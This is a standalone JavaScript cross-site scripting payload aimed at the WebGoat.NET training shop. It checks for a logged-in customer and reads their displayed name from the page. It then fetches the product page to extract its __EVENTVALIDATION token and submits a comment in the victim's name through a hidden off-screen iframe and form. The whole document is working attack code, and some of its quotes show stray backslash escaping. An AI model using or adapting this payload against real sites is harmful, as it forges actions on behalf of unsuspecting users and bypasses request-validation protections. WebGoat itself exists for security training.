
<script>

// Function to do a transparent post request
var numPostFrames = 0;
function post(URL, params) {
	var form = document.createElement("form");
	var iframe = document.createElement("iframe");

	iframe.className = "hidden";
	iframe.name = "iframe" + numPostFrames++;
	iframe.style = "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;"
	document.body.appendChild(iframe);

	form.action = URL;
	form.method = "POST";
	form.target = iframe.name;

	for (var param in params) {
		if (params.hasOwnProperty(param)) {
			var input = document.createElement("input");
			input.type = "hidden";
			input.name = param;
			input.id =  param.replace(\"$\", \"_\");
			input.value = params[param];
			form.appendChild(input);
		}
	}

	document.body.appendChild(form);
	form.submit();
}

// Return the source code of the URL
function httpGet(URL) {
	var xmlHttp = null;

	xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", URL, false);
	xmlHttp.send(null);
	return xmlHttp.responseText;
}

// Assignment of some variables
productID = "S18_1984"
path = "../WebGoatCoins/ProductDetails.aspx"
comment = "Very good product"
tag = \"<span id=\\\"ctl00_HeadLoginView_HeadLoginName\\\">\"; // Tag searched in the code
tagEV = \"<input type=\\\"hidden\\\" name=\\\"__EVENTVALIDATION\\\" id=\\\"__EVENTVALIDATION\\\" value=\\\"\"; // Tag for Event Validation searched in the code
positionTag = document.documentElement.outerHTML.indexOf(tag);

// We check if a user is logged in
if ( document.cookie.indexOf("customer_login") != -1 && positionTag != -1 ) {
	var nom = document.documentElement.outerHTML.substring(positionTag + tag.length,  document.documentElement.outerHTML.indexOf(\"</span>\", positionTag + tag.length));

// Extract EventValidation of the future page
postPage = httpGet(path);
EV = postPage.substring(postPage.indexOf(tagEV) + tagEV.length, postPage.indexOf(\"\\\" \/>\", postPage.indexOf(tagEV) + tagEV.length));

// Send the post request
post(path, {"ctl00$BodyContentPlaceholder$ddlItems": "S10_1678", "ctl00$BodyContentPlaceholder$txtEmail": nom, "ctl00$BodyContentPlaceholder$txtComment": comment, "ctl00$BodyContentPlaceholder$BtnSave": "Save Comment", "ctl00$BodyContentPlaceholder$hiddenFieldProductID": productID, "__EVENTVALIDATION": EV, "__EVENTTARGET": ""});

}

</script>
